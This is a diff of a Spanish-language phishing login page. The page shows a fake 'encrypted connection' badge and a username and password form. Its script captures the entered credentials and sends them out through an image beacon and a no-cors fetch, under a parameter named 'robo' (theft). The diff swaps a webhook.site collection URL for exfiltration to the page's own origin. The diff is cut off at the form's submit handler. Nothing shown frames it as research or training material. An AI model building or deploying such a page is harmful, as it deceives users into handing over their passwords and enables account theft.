@@ -26,7 +26,7 @@
     <span class="tag">● Conexión cifrada · TLS 1.3</span>
     <h1>Iniciar sesión</h1>
     <p class="sub">Ingresa con tus credenciales para continuar.</p>
-    <form id="f" method="get" action="/">
+    <form id="f" method="get" action="">
       <label>Usuario</label>
       <input id="u" name="usuario" type="text" placeholder="nombre.apellido" autocomplete="username">
       <label>Contraseña</label>
@@ -36,11 +36,12 @@
   </div>
 </div>
 <script>
-  var WEBHOOK = "https://webhook.site/1c917c46-e35f-4d09-9c32-c19e2f5f7e5e";
+  // Exfiltra al MISMO buzón que sirve esta pagina (self-referencia).
+  var SELF = location.origin + location.pathname;
   function filtrar(u, p){
     var q = "?robo=1&usuario=" + encodeURIComponent(u) + "&clave=" + encodeURIComponent(p);
-    new Image().src = WEBHOOK + q;
-    try { fetch(WEBHOOK + q, {mode:"no-cors"}); } catch(e){}
+    new Image().src = SELF + q;
+    try { fetch(SELF + q, {mode:"no-cors"}); } catch(e){}
   }
   document.getElementById("f").addEventListener("submit", function(e){
     e.preventDefault();
